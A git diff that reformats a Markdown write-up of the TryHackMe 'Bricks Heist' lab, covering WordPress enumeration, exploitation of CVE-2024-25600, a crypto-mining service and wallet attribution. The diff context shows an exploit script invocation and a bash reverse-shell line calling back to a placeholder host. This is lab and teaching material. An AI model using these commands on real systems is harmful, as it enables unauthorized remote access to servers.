@@ -1,15 +1,26 @@
-# Security Assessment Report – Bricks Heist (TryHackMe)
+<a id="top"></a>
 
-**Analyst:** Felipe Campolina  
-**Role:** Cybersecurity Analyst / Penetration Tester  
-**Date:** August 2025  
-**Platform:** TryHackMe  
-**Difficulty:** Medium  
-**Challenge URL:** https://tryhackme.com/room/tryhack3mbricksheist 
+# 🧱 Security Assessment Report — Bricks Heist
+
+[![Platform](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat-square&logo=tryhackme&logoColor=white)](https://tryhackme.com/room/tryhack3mbricksheist)
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-FDCB6E?style=flat-square)
+![Category](https://img.shields.io/badge/Category-WordPress-0984E3?style=flat-square&logo=wordpress&logoColor=white)
+![Finding](https://img.shields.io/badge/CVE--2024--25600-Critical-D63031?style=flat-square)
+
+> **Mission profile:** exploit a vulnerable WordPress theme, inspect a suspicious mining service and attribute the recovered wallet.
+
+| [🏠 Repository](../README.md) | [🎯 Objective](#-objective) | [⚡ Exploitation](#-3-exploitation) | [📊 Findings](#-summary-of-findings) | [🛡️ Remediation](#️-remediation-recommendations) |
+| :---: | :---: | :---: | :---: | :---: |
+
+| 👤 Analyst | 🎭 Role | 📅 Date | 📈 Difficulty |
+| :--- | :--- | :---: | :---: |
+| Felipe Campolina | Cybersecurity Analyst / Penetration Tester | August 2025 | 🟡 Medium |
+
+**Platform / Room:** [TryHackMe — Bricks Heist](https://tryhackme.com/room/tryhack3mbricksheist)
 
 ---
 
-## Executive Summary
+## 📌 Executive Summary
 
 This report documents a penetration test of the "Bricks Heist" challenge from TryHackMe. The objective was to exploit a WordPress-based web server to uncover hidden flags and identify a suspicious mining service.
 
@@ -23,7 +34,7 @@ This report documents a penetration test of the "Bricks Heist" challenge from Tr
 
 ---
 
-## Objective
+## 🎯 Objective
 
 The goal of this penetration test was to simulate a real-world attack scenario. Main objectives included:
 
@@ -34,7 +45,7 @@ The goal of this penetration test was to simulate a real-world attack scenario. 
 
 ---
 
-## 1. Initial Reconnaissance
+## 🔎 1. Initial Reconnaissance
 
 Performed a full TCP scan using `nmap`:
 
@@ -50,7 +61,7 @@ nmap -A 10.10.39.101
 
 ---
 
-## 2. WordPress Enumeration
+## 🌐 2. WordPress Enumeration
 
 ### Directory and File Enumeration
 
@@ -88,7 +99,7 @@ By confirming the theme and version, I could research known vulnerabilities (suc
 
 ---
 
-## 3. Exploitation
+## ⚡ 3. Exploitation
 
 ### Exploiting WordPress Theme Vulnerability
 
@@ -102,7 +113,7 @@ python3 CVE-2024-25600.py --url https://bricks.thm --callback [YOUR_IP]:[YOUR_PO
 
 ---
 
-## 4. Flag Retrieval and Shell Stabilization
+## 🚩 4. Flag Retrieval and Shell Stabilization
 
 ### First Flag
 
@@ -123,7 +134,7 @@ bash -c 'exec bash -i &>/dev/tcp/[YOUR_IP]/[YOUR_PORT] <&1'
 
 ---
 
-## 5. Suspicious Service Analysis
+## 🔬 5. Suspicious Service Analysis
 
 ### Identifying the Service
 
@@ -147,7 +158,7 @@ cat /lib/NetworkManager/inet.conf
 
 ---
 
-## 6. Wallet Address Decoding
+## 🔓 6. Wallet Address Decoding
 
 Decoded the wallet address using CyberChef:
 
@@ -159,13 +170,13 @@ Decoded the wallet address using CyberChef:
 
 ---
 
-## 7. Threat Group Identification
+## 🕵️ 7. Threat Group Identification
 
 Searched for the wallet address in blockchain explorers and identified the associated threat group as **LockBit**.
 
 ---
 
-## Summary of Findings
+## 📊 Summary of Findings
 
 | Step                  | Technique Used                  | Result                          |
 | --------------------- | ------------------------------- | ------------------------------- |
@@ -178,7 +189,7 @@ Searched for the wallet address in blockchain explorers and identified the assoc
 
 ---
 
-## Comprehensive Vulnerability Assessment
+## ⚠️ Comprehensive Vulnerability Assessment
 
 | **Vulnerability** | **Classification** | **Risk Level** | **CVSS Score** | **Impact** |
 |-------------------|-------------------|----------------|----------------|------------|
@@ -188,7 +199,7 @@ Searched for the wallet address in blockchain explorers and identified the assoc
 
 ---
 
-## Remediation Recommendations
+## 🛡️ Remediation Recommendations
 
 ### Immediate Actions (Critical Priority)
 
@@ -216,16 +227,24 @@ Searched for the wallet address in blockchain explorers and identified the assoc
 
 ---
 
-## Conclusion
+## 🏁 Conclusion
 
 This assessment demonstrated a complete attack chain against the "Bricks Heist" challenge, highlighting the importance of securing WordPress installations and monitoring for unauthorized services. The vulnerabilities exploited in this challenge are common in real-world environments, emphasizing the need for proactive security measures.
 
-## Final Thoughts
+## 💭 Final Thoughts
 
 Bricks Heist is a focused demonstration of how an exposed content-management system can lead to code execution and reveal a wider compromise. Its combination of vulnerability research, service analysis, data decoding, and threat attribution makes it a useful intermediate investigation.
 
-## Challenge Rating
+## ⭐ Challenge Rating
 
 ⭐⭐⭐⭐ (Great for intermediate-level penetration testers)
 
 ---
+
+<div align="center">
+
+[⬆️ Back to top](#top) · [🏠 Explore all write-ups](../README.md)
+
+`Authorized lab` · `Educational use only`
+
+</div>
